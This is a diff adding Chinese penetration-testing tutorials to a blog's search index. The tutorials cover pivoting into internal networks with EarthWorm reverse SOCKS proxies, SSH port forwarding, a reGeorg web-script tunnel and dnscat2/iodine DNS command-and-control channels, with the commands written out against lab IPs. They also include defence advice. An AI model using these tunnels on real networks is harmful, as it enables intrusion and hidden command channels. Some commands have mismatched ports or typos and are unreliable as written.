+<h2 id="1-常用的SOCKS代理工具"><a href="#1-常用的SOCKS代理工具" class="headerlink" title="1 常用的SOCKS代理工具"></a>1 常用的SOCKS代理工具</h2><p>SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。 SOCKS支持多种协议，包括HTTP、FTP等。SOCKS分为SOCKS 4和SOCKS 5两种类型：SOCKS 4只支持TCP协议；SOCKS 5不仅支持TCP/UDP协议，还支持各种身份验证机制等,其标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发。</p>
+<p>SOCKS代理其实可理解为增强版的lcx。它在服务端监听一个服务端口，当有新的连接请求出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能。SOCKS代理工具有很多，在使用时要尽可能选择没有GUI界面的。此外，要尽量选择不需要安装其他依赖软件的SOCKS代理工具，能够支持多平台的工具更佳。</p>
+<p>常用的SOCKS代理工具有：EarthWorm、reGeorg、sSocks、SocksCap64、Proxifier、ProxyChains</p>
+<h2 id="2-SOCKS代理技术在网络环境中的应用"><a href="#2-SOCKS代理技术在网络环境中的应用" class="headerlink" title="2 SOCKS代理技术在网络环境中的应用"></a>2 SOCKS代理技术在网络环境中的应用</h2><h3 id="2-1-EarthWorm的应用"><a href="#2-1-EarthWorm的应用" class="headerlink" title="2.1 EarthWorm的应用"></a>2.1 EarthWorm的应用</h3><p>EW的使用也非常简单，共有六种命令格式，分别是ssocksd、rcsocks、 rssocks、 lcx_slave、lcx_listen、 lex_tran。 其中，用于普通网络环境的正向连接命令是ssocksd,用于反弹连接的命令是resocks、rssocks, 其他命令用于复杂网络环境的多级级联。</p>
+<p>正向代理是指主动通过代理来访问目标机器，反向代理是指目标机器通过代理进行主动连接。</p>
+<p>工具链接：<a href="https://github.com/idlefire/ew" target="_blank" rel="noopener">https://github.com/idlefire/ew</a></p>
+<p>测试环境：</p>
+<ul>
+<li>kali攻击机：192.168.220.165</li>
+<li>web服务器(win7)：192.168.220.143、10.0.52.10</li>
+<li>内网主机(win2003)：10.0.52.20</li>
+</ul>
+<h4 id="（1）正向SOCKS5服务器"><a href="#（1）正向SOCKS5服务器" class="headerlink" title="（1）正向SOCKS5服务器"></a>（1）正向SOCKS5服务器</h4><p>以下命令适用于目标机器拥有一个外网IP地址的情况。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s ssocksd -l 888</span><br></pre></td></tr></table></figure>
+
+<p>执行上述命令，即可架设一个端口为888的SOCKS代理。接下来，使用SocksCap64添加这个IP地址的代理即可。</p>
+<h4 id="（2）反弹SOCKS5服务器"><a href="#（2）反弹SOCKS5服务器" class="headerlink" title="（2）反弹SOCKS5服务器"></a>（2）反弹SOCKS5服务器</h4><p>目标机器没有公网IP地址的情况具体如下(使其可以访问内网资源)。</p>
+<p>首先，将EW上传到kali攻击机中，执行如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 888</span><br></pre></td></tr></table></figure>
+
+
+<p>该命令的意思是：在公网VPS上添加一个转接隧道，把1080端口收到的代理请求转发给888端口。然后，将EW上传到Web服务器中，执行如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s rssocks -d 192.168.220.165 -e 888</span><br></pre></td></tr></table></figure>
+
+<p>该命令的意思是：在IP地址为192.168.220.143的服务器上启动SOCKS5服务，然后，反弹到192.168.220.165kail攻击机的888端口。</p>
+<p>最后，可以在kali的命令行界面看到反弹成功。现在就可以通过访问192.168.220.165 kali攻击机的1080端口，使用在网络右侧IP地址为10.0.52.10的服务器上架设的SOCKS5代理服务了。</p>
+<h4 id="（3）二级网络环境-a"><a href="#（3）二级网络环境-a" class="headerlink" title="（3）二级网络环境(a)"></a>（3）二级网络环境(a)</h4><p>假设已经获得了A主机和B主机的控制权限。A主机配有两块网卡，一块能够连接外网，另一块(10.0.52.10)只能连接内网中的B主机，但无法访问内网中的其他资源。B主机可以访问内网资源，但无法访问外网。</p>
+<p>首先，将EW上传到B主机中，利用ssocksd方式启动888端口的SOCKs代理，命令如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s ssocksd -l 888</span><br></pre></td></tr></table></figure>
+
+<p>然后，将EW上传到A主机中，执行如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s lcx_tran -l 1080 -f 10.0.52.20 -g 888</span><br></pre></td></tr></table></figure>
+
+<p>该命令的意思是：将1080端口收到的代理请求转发给B主机的888端口。现在就可以通过访问A主机的外网1080端口使用在B主机上架设的SOCKS5代理了。</p>
+<h4 id="（4）二级网络环境-b"><a href="#（4）二级网络环境-b" class="headerlink" title="（4）二级网络环境(b)"></a>（4）二级网络环境(b)</h4><p>假设已经获得了A主机和B主机的控制权限。A主机既没有公网IP地址，也无法访向内网资源。B主机可以访问内网资源，但无法访问外网。</p>
+<p>首先，将EW上传到kali攻击机中，把1080端口收到的代理请求转发给888端口，执行如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s lcx_listen -l 10800 -e 888</span><br></pre></td></tr></table></figure>
+
+<p>该命令的意思是：在公网kali攻击机中添加转接隧道，将10800端口收到的代理请求转发给888端口。接着，将EW上传到B主机中，并利用ssocksd方式启动999端口的SOCKS代理，命令如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s ssocksd -l 999</span><br></pre></td></tr></table></figure>
+
+<p>然后，将EW上传到A主机中，执行如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s lcx_slave -d 192.168.220.165 -e 888 -f 10.0.52.10 -g 999</span><br></pre></td></tr></table></figure>
+
+<p>该命令的意思是：在A主机上利用lcx_slave 方式，将攻击机的888端口和B主机的999端口连接起来。</p>
+<h4 id="（5）三级网络环境"><a href="#（5）三级网络环境" class="headerlink" title="（5）三级网络环境"></a>（5）三级网络环境</h4><p>三级网络环境在渗透测试中比较少见，也比较复杂。测试环境为：右侧的内网A主机没有公网IP地址，但可以访问外网；B主机不能访问外网，但可以被A主机访问; C主机可被B主机访问，而且能够访问核心区域。</p>
+<p>首先，将EW上传到kali攻击机中，把1080端口收到的代理请求转发给888端口，执行如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 888</span><br></pre></td></tr></table></figure>
+
+<p>在A主机上执行如下命令，将kali攻击机的888端口和B主机的999端口连接起来。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s lcx_slave -d 192.168.220.165 -e 888 -f &lt;主机B IP地址&gt; -g 999</span><br></pre></td></tr></table></figure>
+
+
+<p>在B主机上执行如下命令，将999端口收到的代理请求转发给777端口。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s lcx_listen -l 999 -e 777</span><br></pre></td></tr></table></figure>
+
+
+<p>在C主机上启动SOCKS5服务，并反弹到B主机的777端口上，命令如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew -s rssocks -d &lt;主机B IP地址&gt; -e 777</span><br></pre></td></tr></table></figure>
+
+<p>现在就可以通过访问kali攻击机的1080 端口使用在C主机上架设的SOCKS 5代理了。</p>
+<h3 id="2-2-在Windows下使用SocksCap64实现内网漫游"><a href="#2-2-在Windows下使用SocksCap64实现内网漫游" class="headerlink" title="2.2 在Windows下使用SocksCap64实现内网漫游"></a>2.2 在Windows下使用SocksCap64实现内网漫游</h3><p>下载并安装SocksCap64, 以管理员权限打开程序。</p>
+<p><img src="https://image.3001.net/images/20220530/16538740332845.png" alt="image-20220527150915729"></p>
+<p>SocksCap64的使用方法比较简单，单击“代理”按钮，添加一个代理，然后设置代理服务器：的IP地址和端口即可。设置完成后，可以单击界面上的闪电图标按钮，测试当前代理服务器是否可以连接。</p>
+<p><img src="https://image.3001.net/images/20220530/16538740361917.png" alt="image-20220527150941049"></p>
+<p>选择浏览器，单击右键，在弹出的快捷菜单中单击“ 在代理隧道中运行选中程序”选项，就可以自由访问内网资源了。</p>
+<h3 id="2-3-在Linux下使用ProxyChains实现内网漫游"><a href="#2-3-在Linux下使用ProxyChains实现内网漫游" class="headerlink" title="2.3 在Linux下使用ProxyChains实现内网漫游"></a>2.3 在Linux下使用ProxyChains实现内网漫游</h3><p>Kali Linux中预装了ProxyChains, 稍加配置就可以使用。打开终端，输人如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>删除“dynamic_ chain” 前面的注释符“#”。来到窗口底部，把“127.0.0.1 9050”改成想要访问的端口的信息。</p>
+<p>测试一下代理服务器是否能正常工作。在终端输入如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxyresolv www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>此时会显示“未找到命令”的提示信息。在终端输人如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;lib&#x2F;proxychains3&#x2F;proxyresolv &#x2F;usr&#x2F;bin&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>再次测试代理服务器的工作是否正常。显示“OK”,表示代理服务器已经正常工作了。现在就可以访问内网了。先访问内网中的网站。在终端输人“proxychains firefox”命令，启动火狐浏览器。</p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>隧道</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应用层隧道传输技术</title>
+    <url>/2022/05/30/3.4%20%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h1 id="应用层隧道传输技术"><a href="#应用层隧道传输技术" class="headerlink" title="应用层隧道传输技术"></a>应用层隧道传输技术</h1><p>应用层的隧道通信技术主要利用应用软件提供的端口来发送数据。常用的隧道协议有SSH、HTTP/HTTPS和DNS。</p>
+<h2 id="1-SSH-协议"><a href="#1-SSH-协议" class="headerlink" title="1 SSH 协议"></a>1 SSH 协议</h2><p>在内网中，几乎所有的Linux/UNIX服务器和网络设备都支持SSH协议。在一般情况下，SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。同时，SSH协议的传输过程是加密的，所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。攻击者使用SSH端口隧道突破防火墙的限制后，能够建立一些之前无法建立的TCP连接。</p>
+<a id="more"></a>
+
+<p>一个普通的SSH命令如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p>创建SSH隧道的常用参数说明如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-C：压缩传输，提高传输速度</span><br><span class="line">-f：将SSH传输转入后台执行，不占用当前的Shell</span><br><span class="line">-N：建立静默连接(建立了连接，但是看不到具体会话)</span><br><span class="line">-g：允许远程主机连接本地用于转发的端口</span><br><span class="line">-L：本地端口转发</span><br><span class="line">-R：远程端口转发</span><br><span class="line">-D：动态转发(SOCKS代理)</span><br><span class="line">-P：指定SSH端口</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-1-本地转发"><a href="#1-1-本地转发" class="headerlink" title="1.1 本地转发"></a>1.1 本地转发</h3><ul>
+<li>kali攻击机：192.168.220.165</li>
+<li>web服务器(ubuntu)：192.168.220.145、10.0.52.132</li>
+<li>内网主机(win2003)：10.0.52.133</li>
+</ul>
+<p>以Web服务器192.168.220.145为跳板，将内网主机192.168.52.133 的3389端口映射到kali攻击机192.168.220.165的4444端口，再访问kali攻击机的4444端口，就可以访问192.168.52.133的3389端口了。</p>
+<p>kali攻击机上执行如下命令，会要求输人Web服务器( 跳板机)的密码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L 4444(VPS端口):10.0.52.133(目标主机):80(目标端口) root@192.168.220.145(跳板机)</span><br></pre></td></tr></table></figure>
+
+<p>在本地访问kali的3307端口，可以发现，已经与内网主机 的3389端口建立了连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3307</span><br></pre></td></tr></table></figure>
+
+<p>本地转发是将远程主机(服务器)某个端口的数据转发到本地机器的指定端口。远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。</p>
+<h3 id="1-2-远程转发"><a href="#1-2-远程转发" class="headerlink" title="1.2 远程转发"></a>1.2 远程转发</h3><ul>
+<li>kali攻击机：192.168.220.165</li>
+<li>web服务器(ubuntu)：192.168.220.145、10.0.52.132</li>
+<li>内网主机(win2003)：10.0.52.133</li>
+</ul>
+<p>以Web服务器为跳板，将kali攻击机的3307端口的流量转发到内网主机的3389端口，然后访问kali攻击机的3307端口，就可以访问内网主机的3389端口了。</p>
+<p>在Web服务器192.168.220.145上执行如下命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R 3307(kali攻击机端口):10.0.52.133(目标主机):3389(目标端口) root@192.168.220.165(kali攻击机ip)</span><br></pre></td></tr></table></figure>
+
+<p>在本地访问kali的3307端口，可以发现，已经与内网主机 的3389端口建立了连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3307</span><br></pre></td></tr></table></figure>
+
+<p>本地转发是将远程主机(服务器)某个端口的数据转发到本地机器的指定端口。远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。</p>
+<h3 id="1-3-动态转发"><a href="#1-3-动态转发" class="headerlink" title="1.3 动态转发"></a>1.3 动态转发</h3><ul>
+<li>kali攻击机：192.168.220.165</li>
+<li>web服务器(ubuntu)：192.168.220.140、10.0.52.137</li>
+<li>内网主机(win2003)：10.0.52.133</li>
+</ul>
+<p>在kali攻击机上执行如下命令，建立一个动态的SOCKS 4/5代理通道，输入Web服务器的密码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -D 7000 root@192.168.220.140</span><br></pre></td></tr></table></figure>
+
+<p>接下来，在本地打开浏览器，设置网络代理。通过浏览器访问内网域控制器10.0.52.133</p>
+<p>输人如下命令，查看本地7000端口是否已经连接。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -tulnp 1 grep &quot;: 7000&quot;</span><br></pre></td></tr></table></figure>
+
+<p>动态端口映射就是建立一个SSH加密的SOCKS 4/5代理通道。任何支持SOCKS 4/5协议的程序都可以使用这个加密通道进行代理访问。</p>
+<h3 id="1-4-防御SSH隧道攻击的思路"><a href="#1-4-防御SSH隧道攻击的思路" class="headerlink" title="1.4 防御SSH隧道攻击的思路"></a>1.4 防御SSH隧道攻击的思路</h3><p>SSH隧道之所以能被攻击者利用，主要是因为系统访问控制措施不够。在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法，都可以避免这一问题。</p>
+<p>如果没有足够的资源来建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问控制策略(从外部到内部；从内部到外部)。</p>
+<h2 id="2-HTTP-HTTPS协议"><a href="#2-HTTP-HTTPS协议" class="headerlink" title="2 HTTP/HTTPS协议"></a>2 HTTP/HTTPS协议</h2><p>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpreter 、tunna<br>等。</p>
+<p>reGeorg是reDuh的升级版，主要功能是把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP协议的通信。reGeorg脚本的特征非常明显，很多杀毒软件都会对其进行查杀。</p>
+<p>reGeorg 支持ASPX、PHP、JSP 等Web脚本，并特别提供了一个Tomeat5版本。</p>
+<p>将脚本文件上传到目标服务器中，使用Kali Linux在本地访问远程服务器上的tunnel.jsp 文件。返回后，利用reGeorgSocksProxy.py脚本监听本地的9999端口，即可建立一个通信链路。</p>
+<p>输人如下命令，查看本地端口，可以发现9999端口已经开启了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http:&#x2F;&#x2F;192.168.220.140:8080&#x2F;tunnel.jsp -p 9999</span><br></pre></td></tr></table></figure>
+
+<p>隧道正常工作之后，可以在本地Kali Linux机器上使用ProxyChains之类的工具，访问目标内网中的资源。</p>
+<p>隧道正常工作之后，可以在本地Kali Linux机器上使用ProxyChains之类的工具，访问目标内网中的资源。</p>
+<p>传统的Web服务器通常不会将本地的3389端口开放到公网，攻击者的暴力破解行为也很容易被传统的安全设备捕获。但是，如果使用HTTP隧道进行端口转发，不仅攻击者可以直接访问Web服务器的3389端口，而且暴力破解所产生的流量的特征也不明显。因此，在日常网络维护中，需要监控HTTP隧道的情况，及时发现问题。</p>
+<h2 id="3-DNS协议"><a href="#3-DNS协议" class="headerlink" title="3 DNS协议"></a>3 DNS协议</h2><p>DNS协议是一种请求/应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现，但基于传统Socket隧道已经濒临淘汰及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP/HTTPS 等难以被禁用的协议已成为攻击者控制隧道的主流渠道。</p>
+<p>一方面，在网络世界中，DNS是一个必不可少的服务；另一方面，DNS报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤DNS流量，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。</p>
+<p>用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器( Command and Control Server,命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端(被控制的计算机)。C&amp;C通信是指植人C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。</p>
+<p>正常网络之间的通信，都是在两台机器之间建立TCP连接后进行的。在进行数据通信时：如果目标是IP地址，可以直接发送报文；如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后, C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序，让其受到控制。</p>
+<p>内网中安装了各种软/硬件防护设施来检查主机与外部网络的连接情况。很多厂商会收集C&amp;C服务端的域名、IP地址、URL等数据，帮助防火墙进行阻断操作。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现C&amp;C通信的技术(特别是DNS隧道技术)出现了。</p>
+<p>DNS隧道的工作原理很简单：在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。</p>
+<p>在使用DNS隧道与外部进行通信时，从表面上看是没有接连外网的(内网网关没有转发IP数据包)，但实际上，内网的DNS服务器进行了中转操作。这就是DNS隧道的工作原理，简单地说，就是将其他协议封装在DNS协议中进行传输。</p>
+<h3 id="3-1-查看DNS的连通性"><a href="#3-1-查看DNS的连通性" class="headerlink" title="3.1 查看DNS的连通性"></a>3.1 查看DNS的连通性</h3><p>首先，需要知道当前服务器是否允许通过内部DNS解析外部域名，也就是要测试DNS的连通性。</p>
+<p>输人如下命令，查询当前内部域名及IP地址。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;resolv.conf|grep -v &#39;#&#39;</span><br></pre></td></tr></table></figure>
+
+<p>输人如下命令，查看能否与内部DNS通信。可以看到，能够解析内部域名</p>
+<p>输人如下命令，查看能否与内部DNS通信。可以看到，能够解析内部域名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup ad.com</span><br></pre></td></tr></table></figure>
+
+
+<p>输人如下命令,查询能否通过内部DNS服务器解析外部域名。可以看到，能够通过内部DNS服务器解析外部域名，这意味着可以使用DNS隧道实现隐蔽通信。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-dnscat2"><a href="#3-2-dnscat2" class="headerlink" title="3.2 dnscat2"></a>3.2 dnscat2</h3><p>dnscat2是一款开源软件。它使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证；使用Shell及DNS查询类型( TXT、MX、CNAME、A. AAAA),多个同时进行的会话类似于SSH中的隧道，dnscat2 是一个命令与控制工具。</p>
+<p>使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。</p>
+<ul>
+<li>直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求。</li>
+<li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，中继模式的速度较慢。</li>
+</ul>
+<p>如果目标内网放行所有的DNS请求，dnscat2 会使用直连模式，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以“dnscat”开头的，因此防火墙可以很容易地将直连模式的通信检测出来。</p>
+<p>如果目标内网中的请求仅限于白名单服务器或者特定的域, dnscat2会使用中继模式来申请一个域名，并将运行dnscat2服务端的服务器指定为受信任的DNS服务器。</p>
+<p>dnscat2通过DNS进行控制并执行命令。与同类工具相比，dnscat2 具有如下特点。</p>
+<ul>
+<li>支持多个会话。</li>
+<li>流量加密。</li>
+<li>使用密钥防止MiTM攻击。</li>
+<li>在内存中直接执行PowerShell脚本。</li>
+<li>隐蔽通信。</li>
+</ul>
+<h4 id="3-2-1-服务端"><a href="#3-2-1-服务端" class="headerlink" title="3.2.1 服务端"></a>3.2.1 服务端</h4><p>安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br><span class="line">cd dnscat2&#x2F;server&#x2F;</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure>
+
+
+<p>使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#启动</span><br><span class="line">sudo ruby.&#x2F;dnscat2.rb abc.com --secret&#x3D;123456  # abc.com 自定义DNS传输的域名；--secret 自定义连接密码</span><br><span class="line">sudo ruby.&#x2F;dnscat2.rb --dns host&#x3D;127.0.0.1,port&#x3D;533 --secret&#x3D;123456  #设置监听端口</span><br><span class="line">sudo ruby.&#x2F;dnscat2.rb abc.com --secret&#x3D;123456 --security&#x3D;open --no-cache   #--security 规定了安全级别；--no-cache 禁止缓存</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-2-客户端"><a href="#3-2-2-客户端" class="headerlink" title="3.2.2 客户端"></a>3.2.2 客户端</h4><p>安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br><span class="line">$ cd dnscat2&#x2F;client&#x2F;</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+
+
+<p>使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dnscat --secret&#x3D;123456 abc.com </span><br><span class="line">dnscat --dns server&#x3D;&lt;your dnscat2 server ip&gt;,port&#x3D;553 --secret&#x3D;123456</span><br></pre></td></tr></table></figure>
+
+<p>具体的使用方法大家自己去看官方手册</p>
+<h3 id="3-3-iodine"><a href="#3-3-iodine" class="headerlink" title="3.3 iodine"></a>3.3 iodine</h3><p>碘的原子序数为53，而这恰好是DNS的端口号，故该工具被命名为“iodine”</p>
+<p>iodine可以通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。iodine 是基于C语言开发的，分为服务端程序iodined 和客户端程序iodine。Kali Linux内置了iodine 。</p>
+<p>与同类工具相比，iodine 具有如下特点：</p>
+<ul>
+<li>不会对下行数据进行编码。</li>
+<li>支持多平台，包括Linux、 BSD、Mac OS、Windows。</li>
+<li>支持16个并发连接。</li>
+<li>支持强制密码机制。</li>
+<li>支持同网段隧道IP地址(不同于服务器一客户端网段)。</li>
+<li>支持多种DNS记录类型。</li>
+<li>提供了丰富的隧道质量检测措施。</li>
+</ul>
+<p>iodine支持直接转发和中继两种模式，其原理是：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道连接，处于同一个局域网(可以通过ping命令通信)。在客户端和服务端之间建立连接后，客户机上会多出一块名为“dns0”的虚拟网卡。</p>
+<p>具体的使用方法大家自己去看官方手册</p>
+<h3 id="3-4-防御DNS隧道攻击的方法"><a href="#3-4-防御DNS隧道攻击的方法" class="headerlink" title="3.4 防御DNS隧道攻击的方法"></a>3.4 防御DNS隧道攻击的方法</h3><p>防御隧道攻击并非易事，特别是防御DNS隧道攻击。通过如下操作，能够防御常见的隧道攻击行为。</p>
+<ul>
+<li>禁止网络中的任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信。</li>
+<li>虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器/网关会这样做。因此，可以将邮件服务</li>
+<li>器/网关列人白名单并阻止传人和传出流量中的TXT请求。</li>
+<li>跟踪用户的DNS查询次数。如果达到阈值，就生成相应的报告。</li>
+<li>阻止ICMP。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>隧道</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>传输层隧道技术</title>
     <url>/2022/05/04/3.3%20%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
     <content><![CDATA[<h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括tcp隧道、udp隧道和常规端口转发。在渗透测试中，如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用IPTABles打开指定端口。</p>
@@ -1170,7 +1710,7 @@
 
 <h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><h3 id="域-1"><a href="#域-1" class="headerlink" title="域"></a>域</h3><p>一个有安全边界的计算机集合（升级版的工作组），不同域不可互访，想要访问域内的资源必须以合法的身份访问，并且有响应的权限。</p>
 <h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>类似于域的门禁，负责所有计算机用户的身份权限验证工作，域内的计算机如果想互相访问就需要经过域控制器的审核。</p>
-<h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>就是一个域。一般至少有两台服务器，一台为域控，另一台做为备份域控，一般活动目录的数据库是存在域控中的。一旦使用过程中其中一台挂掉了，可以使用另一台恢复。否侧域内的其他用户就不能登录域了。</p>
+<h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>就是一个域。一般至少有两台服务器，一台为域控，另一台做为备份域控，一般活动目录的数据库是存在域控中的。一旦使用过程中其中一台挂掉了，可以使用另一台恢复。否则域内的其他用户就不能登录域了。</p>
 <h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>由于管理的特殊需求，需要在网络中划分多个域，第一个域就是父域，之后划分出的域就是该域的子域。比如公司的一些保密部门需要一些特殊的策略，那么可以将这些部门单独作为一个子域来管理，并且这个子域可以自己管理自己的资源。</p>
 <h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>是多个域建立信任关系的集合。一个域管理员只能管理本域，不能访问或者管理其他的域，如果两个域之间需要互相访问，则需要建立信任关系。</p>
 <p><img src="https://image.3001.net/images/20220414/16499051466543.png" alt="image-20220121141743939"></p>
